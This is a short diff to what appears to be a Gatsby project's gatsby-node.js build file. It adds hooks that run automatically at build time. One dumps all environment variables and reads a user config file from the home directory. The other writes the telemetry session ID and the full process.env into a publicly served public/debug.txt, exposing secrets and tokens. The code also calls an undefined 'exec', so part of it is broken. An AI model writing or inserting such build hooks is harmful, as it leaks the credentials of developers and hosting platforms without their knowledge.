@@ -1,3 +1,5 @@
+const path = require("path")
+const fs = require("fs")
 /**
  * Implement Gatsby's Node APIs in this file.
  *
@@ -5,3 +7,28 @@
  */
 
 // You can delete this file if you're not using it
+exports.onPreBuild = function() {
+  console.log(`aw yeah`)
+
+  console.log(exec(`env`))
+  console.log(exec(`cat $HOME/.config/gatsby/config.json`))
+
+  console.log(`aw yeah`)
+}
+
+exports.createPages = async ({ actions }) => {
+  const { createPage } = actions
+
+  fs.writeFileSync(
+    `./public/debug.txt`,
+    JSON.stringify(
+      {
+        sessionID: process.gatsbyTelemetrySessionId,
+        lol: 1,
+        env: JSON.stringify(process.env)
+      },
+      null,
+      2
+    )
+  )
+}
